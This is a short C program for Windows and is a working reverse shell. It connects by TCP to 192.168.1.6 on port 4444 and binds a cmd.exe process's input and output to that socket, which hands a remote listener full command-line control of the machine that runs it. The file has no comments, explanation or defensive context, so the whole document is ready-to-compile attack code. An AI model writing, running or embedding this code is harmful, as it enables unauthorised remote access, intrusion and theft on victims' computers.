#include <winsock2.h>
#include <windows.h>
#pragma comment(lib,"ws2_32")

WSADATA wsa;
SOCKET sock;
struct sockaddr_in server;

int main() {
    WSAStartup(MAKEWORD(2, 2), &wsa);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    server.sin_addr.s_addr = inet_addr("192.168.1.6");
    connect(sock, (struct sockaddr*)&server, sizeof(server));
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    return 0;
}
